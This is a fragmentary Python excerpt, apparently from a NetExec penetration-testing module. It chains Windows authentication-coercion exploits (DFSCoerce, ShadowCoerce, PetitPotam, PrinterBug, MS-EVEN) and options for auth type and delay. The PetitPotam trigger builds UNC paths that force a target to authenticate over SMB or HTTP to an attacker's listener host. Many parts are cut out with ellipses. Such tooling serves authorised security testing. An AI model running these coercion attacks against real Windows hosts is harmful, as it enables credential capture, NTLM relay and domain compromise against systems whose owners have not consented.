...
class NXCModule:
    ...
    def options(self, context, module_options):
        ...
        AUTH_TYPE      Authentication type (smb, http	default: smb)
        DELAY          Delay in seconds between each exploit request (default: 0)
        M              Alias for METHOD
        ...
        self.auth_type = "smb"  # default
        if "AUTH_TYPE" in module_options:
            self.auth_type = module_options["AUTH_TYPE"].lower()
        self.delay = 0
        if "DELAY" in module_options:
            self.delay = float(module_options["DELAY"])
            ...
            try:
                ...
                if dfscocerceconnect is not None:
                    ...
                    if self.listener is not None:  # exploit
                        dfscocerceclass.exploit(dfscocerceconnect, self.listener, self.always_continue, "netdfs", self.delay)
        ...
        if self.method == "all" or self.method[:1] == "s":  # ShadowCoerce
            ...
            try:
                ...
                if shadowcocerceconnect is not None:
                    ...
                    if self.listener is not None:  # exploit
                        shadowcocerceclass.exploit(shadowcocerceconnect, self.listener, self.always_continue, "Fssagentrpc", self.delay)
                ...
                try:
                    ...
                    if petitpotamconnect is not None:
                        ...
                        if self.listener is not None:  # exploit TODO
                            exploit_status = petitpotamclass.exploit(petitpotamconnect, self.listener, self.always_continue, pipe, self.auth_type, self.delay)
            ...
            for pipe in pipes:
                try:
                    ...
                    if printerbugconnect is not None:
                        ...
                        if self.listener is not None:  # exploit
                            exploit_status = printerbugclass.exploit(printerbugconnect, self.listener, target, self.always_continue, pipe, self.delay)
                            if not self.always_continue and exploit_status:
                                break
        ...
        if self.method == "all" or self.method[:1] == "m":  # MSEven
            ...
            try:
                ...
                if msevenconnect is not None:
                    ...
                    if self.listener is not None:  # exploit
                        msevenclass.exploit(msevenconnect, self.listener, self.always_continue, "eventlog", self.delay)
...
class ShadowCoerceTrigger:
    ...
    def exploit(self, dce, listener, always_continue, pipe, delay=0):
...
class PetitPotamtTrigger:
    ...
    def exploit(self, dce, listener, always_continue, pipe, auth_type, delay=0):
        self.context.log.debug("Sending EfsRpcAddUsersToFile!")
        try:
            request = EfsRpcAddUsersToFile()
            if auth_type == "http":
                request["FileName"] = f"\\\\{listener}@80/aaa\\test\\Settings.ini\x00"
            else:
        ...
        try:
            ...
            if auth_type == "http":
                request["SrcFileName"] = f"\\\\{listener}@80/aaa\\test\\Settings.ini\x00"
                request["DestFileName"] = f"\\\\{listener}@80/aaa\\test\\Settings.ini\x00"
            else:
...
class PrinterBugTrigger:
    ...
    def exploit(self, dce, listener, target, always_continue, pipe, delay=0):
        try:
